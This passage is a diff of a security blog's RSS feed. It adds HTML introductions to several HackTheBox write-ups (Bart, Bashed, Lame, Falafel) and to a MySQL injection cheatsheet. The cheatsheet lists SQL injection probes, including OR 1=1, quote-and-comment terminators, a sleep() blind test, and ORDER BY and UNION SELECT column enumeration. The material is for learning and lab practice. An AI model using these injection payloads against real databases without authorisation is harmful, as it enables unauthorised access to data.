+&lt;/a&gt;
+&lt;/h1&gt;
+
+&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;introduction&#34; --&gt;
+
+&lt;h2 class=&#34;header-anchor-wrapper&#34;&gt;Introduction
+  &lt;a href=&#34;#introduction&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h2&gt;
+
+&lt;p&gt;I came across this question and was asked so often that I decided to turn it into a blog post.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -85,8 +377,39 @@ Disclaimer The following suggestions will be more towards getting into penetrati
       <pubDate>Tue, 11 Aug 2020 17:22:10 +0000</pubDate>
       
       <guid>http://localhost:1313/hackthebox/htb-bart/</guid>
-      <description>HackTheBox - Bart Writeup w/o Metasploit Introduction Bart is a retired Windows machine from HackTheBox. It has been rated as a medium difficulty machine, as it requires you to spend a good amount of time to enumerate but the exploiting part is not so hard.
-We are presented with just one service - HTTP, consists of three different sites, we abuse a user enumeration functionality for first login, we perform some OSINT to get around the next login, and then abuse a &amp;ldquo;LFI&amp;rdquo; vulnerability to poison the logs.</description>
+      <description>&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;hackthebox---bart-writeup-wo-metasploit&#34; --&gt;
+
+&lt;h1 class=&#34;header-anchor-wrapper&#34;&gt;HackTheBox - Bart Writeup w/o Metasploit
+  &lt;a href=&#34;#hackthebox---bart-writeup-wo-metasploit&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h1&gt;
+
+&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;introduction&#34; --&gt;
+
+&lt;h2 class=&#34;header-anchor-wrapper&#34;&gt;Introduction
+  &lt;a href=&#34;#introduction&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h2&gt;
+
+&lt;p&gt;Bart is a retired Windows machine from HackTheBox. It has been rated as a medium difficulty machine, as it requires you to spend a good amount of time to enumerate but the exploiting part is not so hard.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -95,7 +418,39 @@ We are presented with just one service - HTTP, consists of three different sites
       <pubDate>Sat, 08 Aug 2020 23:43:37 +0000</pubDate>
       
       <guid>http://localhost:1313/hackthebox/htb-bashed/</guid>
-      <description>HackTheBox - Bashed Writeup w/o Metasploit Introduction Bashed is a retired HackTheBox machine, rated easy and rightfully so. We go from finding a hidden web shell to quickly gaining root due to over privileged users. I present a small discussion at the end of the write-up that I had with some folks on what steps could be taken to secure something like this on a corporate level, not really necessary but fun.</description>
+      <description>&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;hackthebox---bashed-writeup-wo-metasploit&#34; --&gt;
+
+&lt;h1 class=&#34;header-anchor-wrapper&#34;&gt;HackTheBox - Bashed Writeup w/o Metasploit
+  &lt;a href=&#34;#hackthebox---bashed-writeup-wo-metasploit&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h1&gt;
+
+&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;introduction&#34; --&gt;
+
+&lt;h2 class=&#34;header-anchor-wrapper&#34;&gt;Introduction
+  &lt;a href=&#34;#introduction&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h2&gt;
+
+&lt;p&gt;Bashed is a retired HackTheBox machine, rated easy and rightfully so. We go from finding a hidden web shell to quickly gaining root due to over privileged users. I present a small discussion at the end of the write-up that I had with some folks on what steps could be taken to secure something like this on a corporate level, not really necessary but fun.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -104,7 +459,39 @@ We are presented with just one service - HTTP, consists of three different sites
       <pubDate>Sat, 01 Aug 2020 19:03:06 +0000</pubDate>
       
       <guid>http://localhost:1313/hackthebox/htb-lame/</guid>
-      <description>HackTheBox - Lame Writeup w/o Metasploit Introduction Lame was the first machine on the HackTheBox platform, it is very much like any other Boot2Root machine but is good for beginners. Lame is a Linux machine and has rightfully rated as Easy by the platform. There are 2 ways to own the machine and a false positive which may or may not lead to a rabbit hole, depending on the way you approach it.</description>
+      <description>&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;hackthebox---lame-writeup-wo-metasploit&#34; --&gt;
+
+&lt;h1 class=&#34;header-anchor-wrapper&#34;&gt;HackTheBox - Lame Writeup w/o Metasploit
+  &lt;a href=&#34;#hackthebox---lame-writeup-wo-metasploit&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h1&gt;
+
+&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;introduction&#34; --&gt;
+
+&lt;h2 class=&#34;header-anchor-wrapper&#34;&gt;Introduction
+  &lt;a href=&#34;#introduction&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h2&gt;
+
+&lt;p&gt;Lame was the first machine on the HackTheBox platform, it is very much like any other Boot2Root machine but is good for beginners. Lame is a Linux machine and has rightfully rated as Easy by the platform. There are 2 ways to own the machine and a false positive which may or may not lead to a rabbit hole, depending on the way you approach it.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -113,7 +500,233 @@ We are presented with just one service - HTTP, consists of three different sites
       <pubDate>Wed, 29 Jul 2020 13:10:00 +0000</pubDate>
       
       <guid>http://localhost:1313/sqli-cheatsheet/</guid>
-      <description>MySQL Injection cheatsheet Testing checklist Name Character Function Single quote &#39; String terminator Semi colon ; Query terminator Comment -- - Removes the rest of the query Comment # Removes the rest of the query Comment /*comment this*/ Can be placed anywhere in a query, used for bypassing weak filters Single quote with a comment &#39;-- - End a string and remove rest of the query Single quote, semi colon and a comment &#39;;-- - End a string, end query, and remove rest of the query OR operator OR 1=1-- - For integers, true test OR operator OR 1=2-- - For integers, false test OR operator &#39; OR &#39;1&#39;=&#39;1&#39;-- - For strings, test test AND operator AND 1=1-- - For integers, true test AND operator AND 1=2-- - For integers, false test AND operator &#39; AND &#39;1&#39;=&#39;1&#39;-- - For strings, true test Arithmetic ?</description>
+      <description>&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;mysql-injection-cheatsheet&#34; --&gt;
+
+&lt;h1 class=&#34;header-anchor-wrapper&#34;&gt;MySQL Injection cheatsheet
+  &lt;a href=&#34;#mysql-injection-cheatsheet&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h1&gt;
+
+&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;testing-checklist&#34; --&gt;
+
+&lt;h2 class=&#34;header-anchor-wrapper&#34;&gt;Testing checklist
+  &lt;a href=&#34;#testing-checklist&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h2&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;Name&lt;/th&gt;
+          &lt;th&gt;Character&lt;/th&gt;
+          &lt;th&gt;Function&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Single quote&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;&#39;&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;String terminator&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Semi colon&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;;&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Query terminator&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Comment&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;-- -&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Removes the rest of the query&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Comment&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;#&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Removes the rest of the query&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Comment&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;/*comment this*/&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Can be placed anywhere in a query, used for bypassing weak filters&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Single quote with a comment&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;&#39;-- -&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;End a string and remove rest of the query&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Single quote, semi colon and a comment&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;&#39;;-- -&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;End a string, end query, and remove rest of the query&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;OR operator&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;OR 1=1-- -&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;For integers, &lt;code&gt;true&lt;/code&gt; test&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;OR operator&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;OR 1=2-- -&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;For integers, &lt;code&gt;false&lt;/code&gt; test&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;OR operator&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;&#39; OR &#39;1&#39;=&#39;1&#39;-- -&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;For strings, &lt;code&gt;test&lt;/code&gt; test&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;AND operator&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;AND 1=1-- -&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;For integers, &lt;code&gt;true&lt;/code&gt; test&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;AND operator&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;AND 1=2-- -&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;For integers, &lt;code&gt;false&lt;/code&gt; test&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;AND operator&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;&#39; AND &#39;1&#39;=&#39;1&#39;-- -&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;For strings, &lt;code&gt;true&lt;/code&gt; test&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Arithmetic&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;?id=2-1&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;For integers, arithmetic operation would load the resultant post&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Sleep function&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;OR sleep(5)-- -&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Blind test&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;functions&#34; --&gt;
+
+&lt;h2 class=&#34;header-anchor-wrapper&#34;&gt;Functions
+  &lt;a href=&#34;#functions&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h2&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;Function&lt;/th&gt;
+          &lt;th&gt;Description&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;database()&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Get the name of the working database&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;user()&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Get the name of the user operating on the working database&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;version()&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;MySQL version&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;concat()&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Concatenate two or more strings per row&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;group_concat()&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Concatenate all the strings in one row&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;substring(&#39;string&#39;/&amp;lt;column_name&amp;gt;,&amp;lt;offset&amp;gt;,&amp;lt;length&amp;gt;)&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Get a part of the value of a string or column&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;ord()&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Convert the value to ordinal (decimal)&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;number-of-columns&#34; --&gt;
+
+&lt;h2 class=&#34;header-anchor-wrapper&#34;&gt;Number of Columns
+  &lt;a href=&#34;#number-of-columns&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h2&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;Method&lt;/th&gt;
+          &lt;th&gt;Description&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;ORDER BY 3-- -&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;For numbers. If column index provided exceeds the number of column present in the table, there will be an error&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;&#39; ORDER BY 3-- -&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;For string. If column index provided exceeds the number of column present in the table, there will be an error&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt; UNION SELECT 1,2,3-- -&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;For numbers. It will throw an error till right number of columns haven&amp;rsquo;t been &amp;ldquo;SELECT&amp;quot;ed&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;database-contents&#34; --&gt;
+
+&lt;h2 class=&#34;header-anchor-wrapper&#34;&gt;Database Contents
+  &lt;a href=&#34;#database-contents&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h2&gt;
+
+&lt;p&gt;&lt;em&gt;Works with UNION queries&lt;/em&gt;&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -122,7 +735,39 @@ We are presented with just one service - HTTP, consists of three different sites
       <pubDate>Sat, 18 Jul 2020 14:46:16 +0000</pubDate>
       
       <guid>http://localhost:1313/hackthebox/htb-falafel-writeup-w-o-metasploit/</guid>
-      <description>HackTheBox - Falafel Writeup w/o Metasploit Introduction Falafel is a retired HackTheBox machine and one of the most interesting machines I have hacked on the platform. It is a Linux machine with some really fun vulnerabilities to exploit. The machine is rated hard but the author was kind enough to give us hints as we hack through it. The machine requires you to know a range of nuances from SQLi to Linux filesystems.</description>
+      <description>&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;hackthebox---falafel-writeup-wo-metasploit&#34; --&gt;
+
+&lt;h1 class=&#34;header-anchor-wrapper&#34;&gt;HackTheBox - Falafel Writeup w/o Metasploit
+  &lt;a href=&#34;#hackthebox---falafel-writeup-wo-metasploit&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h1&gt;
+
+&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;introduction&#34; --&gt;
+
+&lt;h2 class=&#34;header-anchor-wrapper&#34;&gt;Introduction
+  &lt;a href=&#34;#introduction&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h2&gt;
+
